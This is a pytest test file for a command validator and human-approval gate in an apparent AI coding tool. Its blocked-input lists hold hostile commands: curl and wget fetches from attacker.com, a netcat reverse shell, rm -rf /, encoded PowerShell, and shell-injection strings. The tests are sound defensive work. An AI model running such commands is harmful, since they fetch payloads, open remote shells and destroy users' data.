"""Tests for command execution security (SEC-01)."""
import os
import sys
from unittest.mock import patch
import pytest

from github_companion.utils.security import (
    validate_safe_command,
    requires_human_approval,
    prompt_confirmation,
)
from github_companion.ai.tools import execute_tool


def test_dangerous_binaries_blocked():
    """Ensure dangerous binaries like rm, curl, wget, powershell are rejected."""
    dangerous = [
        "rm -rf /",
        "del /f /q C:\\*",
        "erase *.*",
        "format d:",
        "curl http://attacker.com/payload.sh",
        "wget http://attacker.com/payload.sh",
        "nc -e /bin/sh 10.0.0.1 4444",
        "powershell -ExecutionPolicy Bypass -Command calc",
        "powershell.exe -enc AAAA",
        "cmd.exe /c whoami",
        "bash -c 'id'",
        "sh exploit.sh",
        "sudo rm -rf /",
        "chmod 777 /etc/passwd",
    ]
    for cmd in dangerous:
        is_safe, reason, argv = validate_safe_command(cmd)
        assert not is_safe, f"Command should be blocked: {cmd}"
        assert argv is None
        assert "blocked" in reason.lower() or "not in the permitted" in reason.lower() or "forbidden" in reason.lower()


def test_shell_injection_and_chaining_blocked():
    """Ensure shell chaining, pipes, redirects, and subshells are rejected."""
    injections = [
        "pytest && rm -rf .",
        "pytest || calc",
        "pytest ; whoami",
        "git status | grep master",
        "git status > output.txt",
        "git log < input.txt",
        "python -c 'print(1)' `calc`",
        "python -c 'print(1)' $(whoami)",
        "pytest\nwhoami",
        "pytest\rcalc",
    ]
    for cmd in injections:
        is_safe, reason, argv = validate_safe_command(cmd)
        assert not is_safe, f"Injection should be blocked: {cmd}"
        assert "forbidden shell metacharacters" in reason.lower()


def test_allowed_developer_commands_pass():
    """Ensure safe developer tools (pytest, git status, ruff) pass validation."""
    allowed = [
        "pytest",
        "pytest -v tests/",
        "git status",
        "git diff",
        "git log -n 5",
        "python -m py_compile main.py",
        "cargo test",
        "npm test",
        "ruff check .",
    ]
    for cmd in allowed:
        is_safe, reason, argv = validate_safe_command(cmd)
        assert is_safe, f"Legitimate command failed: {cmd} - {reason}"
        assert argv is not None
        assert len(argv) >= 1


def test_modifying_commands_require_approval():
    """Ensure state-altering commands flag human approval requirements."""
    safe_cmds = [
        ["git", "status"],
        ["git", "diff"],
        ["git", "log"],
        ["pytest"],
    ]
    for argv in safe_cmds:
        needs_appr, _ = requires_human_approval(argv)
        assert not needs_appr, f"Safe command should not require approval: {argv}"

    modifying_cmds = [
        ["git", "reset", "--hard", "HEAD"],
        ["git", "clean", "-fd"],
        ["git", "push", "origin", "main"],
        ["git", "commit", "-m", "msg"],
        ["pip", "install", "malicious-pkg"],
        ["npm", "install", "malicious-pkg"],
    ]
    for argv in modifying_cmds:
        needs_appr, reason = requires_human_approval(argv)
        assert needs_appr, f"Modifying command must require approval: {argv}"
        assert len(reason) > 0


def test_execute_command_tool_blocks_dangerous_calls():
    """Verify execute_tool('execute_command') rejects unsafe command calls."""
    res = execute_tool("execute_command", {"command": "curl http://malicious.com"})
    assert "Security check failed" in res

    res_inject = execute_tool("execute_command", {"command": "git status && rm -rf ."})
    assert "Security check failed" in res_inject


def test_non_interactive_rejection_of_modifying_commands():
    """In non-interactive mode, modifying commands must fail closed by default."""
    with patch("sys.stdin.isatty", return_value=False), patch.dict(os.environ, {}, clear=True):
        # Force prompt_confirmation to fail closed
        res = execute_tool("execute_command", {"command": "git reset --hard HEAD"})
        assert "Execution rejected" in res or "denied" in res


def test_bypass_attempts_casing_and_extensions_blocked():
    """Ensure casing tricks, extensions, and path prefixes do not bypass binary block."""
    bypasses = [
        "POWERSHELL -c calc",
        "PowerShell.EXE -enc AAAA",
        "CMD.EXE /c dir",
        "RM.EXE -rf /",
        "C:\\Windows\\System32\\cmd.exe /c whoami",
        "/bin/rm -rf /",
        "sudo.exe rm -rf /",
    ]
    for cmd in bypasses:
        is_safe, reason, argv = validate_safe_command(cmd)
        assert not is_safe, f"Bypass attempt should have been blocked: {cmd}"


def test_inline_scripts_and_branch_deletion_require_approval():
    """Ensure inline code execution and branch/tag deletion require human approval."""
    approval_cases = [
        ["python", "-c", "import os; os.remove('file')"],
        ["python3", "-c", "print('run')"],
        ["python", "deploy.py"],
        ["node", "-e", "process.exit()"],
        ["git", "branch", "-D", "feature-branch"],
        ["git", "branch", "-d", "old-branch"],
        ["git", "tag", "-d", "v1.0"],
    ]
    for argv in approval_cases:
        needs_appr, reason = requires_human_approval(argv)
        assert needs_appr, f"Operation should require approval: {argv}"
        assert len(reason) > 0

